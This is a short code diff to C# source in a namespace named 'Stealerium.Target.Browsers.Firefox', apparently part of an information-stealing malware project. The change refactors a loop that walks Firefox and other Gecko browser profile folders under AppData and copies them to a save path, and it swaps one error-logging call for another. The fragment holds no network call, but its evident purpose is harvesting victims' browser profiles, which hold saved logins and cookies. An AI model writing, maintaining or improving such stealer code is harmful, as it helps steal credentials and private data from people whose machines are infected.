@@ -11,8 +11,7 @@ namespace Stealerium.Target.Browsers.Firefox
             foreach (var path in Paths.SGeckoBrowserPaths)
                 try
                 {
-                    var name = new DirectoryInfo(path).Name;
-                    var bSavePath = sSavePath + "\\" + name;
+                    var bSavePath = sSavePath + "\\" + path;
                     var browser = Paths.Appdata + "\\" + path;
 
                     if (Directory.Exists(browser + "\\Profiles"))
@@ -34,7 +33,7 @@ namespace Stealerium.Target.Browsers.Firefox
                 }
                 catch (Exception ex)
                 {
-                    Logging.Log("Firefox >> Failed to recover data\n" + ex);
+                    Logging.LogEx(ex);
                 }
         }
     }
